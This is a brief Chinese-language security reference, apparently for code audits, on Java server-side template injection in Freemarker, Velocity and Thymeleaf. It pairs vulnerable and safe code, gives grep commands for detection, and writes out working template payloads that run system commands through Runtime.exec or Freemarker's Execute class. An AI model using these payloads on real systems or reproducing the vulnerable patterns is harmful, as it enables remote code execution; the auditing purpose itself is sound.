# Java SSTI 模板注入

## 确认条件

用户输入作为模板内容传给模板引擎。

## Freemarker

```java
//
Configuration cfg = new Configuration(Configuration.VERSION_2_3_31);
Template t = new Template("name", new StringReader(userInput), cfg);
// <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

Template t = cfg.getTemplate(userInput);
// ../../web.xml 读取模板 → 信息泄露

// 用户输入作为变量
Map<String, Object> root = new HashMap<>();
root.put("input", userInput);
Template t = cfg.getTemplate("template.ftl");
Writer out = new StringWriter();
t.process(root, out);
```

## Velocity

```java
//
Velocity.evaluate(context, writer, "log", userInput);
// #set($e="e")$e.getClass().forName("java.lang.Runtime").getRuntime().exec("id")
// #set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))$rt.getRuntime().exec('id')

// 仅作为变量传入模板
VelocityContext ctx = new VelocityContext();
ctx.put("userInput", userInput);
```

## Thymeleaf

```java
// 视图名包含用户输入
@GetMapping("/path")
public String get(@RequestParam String fragment) {
    return "fragments/" + fragment;
}
// 访问: /path?fragment=__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).next()}__::.x

// 视图名不包含用户输入
@GetMapping("/path")
public String get(Model model, @RequestParam String name) {
    model.addAttribute("name", name);
    return "fragments/hello";  // 固定视图名
}
```

## 检测命令

```bash
grep -rn "Template\|Velocity\.evaluate\|StringReader" --include="*.java" | grep '\$'
grep -rn "process(\|evaluate(" --include="*.java" | grep "request\|param\|input"
```
